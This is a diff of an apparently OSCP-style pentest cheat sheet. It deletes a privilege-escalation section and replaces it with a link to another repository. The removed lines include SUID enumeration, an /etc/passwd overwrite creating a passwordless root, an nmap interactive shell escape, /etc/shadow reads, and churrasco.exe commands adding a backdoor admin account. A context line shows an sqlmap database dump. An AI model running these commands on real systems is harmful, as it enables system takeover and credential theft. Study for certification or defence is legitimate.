@@ -91,37 +91,8 @@ sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T
 ## PRIVILAGE ESCALATION
 
 
-Linux Commands:
-> cat /etc/issue
-> uname -a
-> cat /proc/version
-> find / -perm -u=s -type f 2>/dev/null
-> find / -perm -g=s -type f 2>/dev/null
-> find / -perm -2 ! -type l -ls 2>/dev/null @Yazma yetkisi olan dosyalar
-```
-echo root::0:0:root:/root:/bin/bash > /etc/passwd
-su
-```
+https://github.com/emre-uzun/oscp/tree/master/privilage-escalation
 
-```
-sudo nmap --interactive
-!id
-!cat /root/proof.txt
-```
-
-> netstat -ano
-> cat config.php | grep db
-> sudo -l
-> run post/multi/recon/local_exploit_suggester
-
-```
-upload /root/Desktop/test/churrasco.exe C:\\Inetpub\\
-shell
-churrasco.exe “net user emr Password1 /add”
-churrasco.exe “net localgroup Administrator emr /add”
-```
-
-> cat /etc/shadow @Normal kullanıcı göremez
 
 
 ## ANTIVIRUS BYPASS
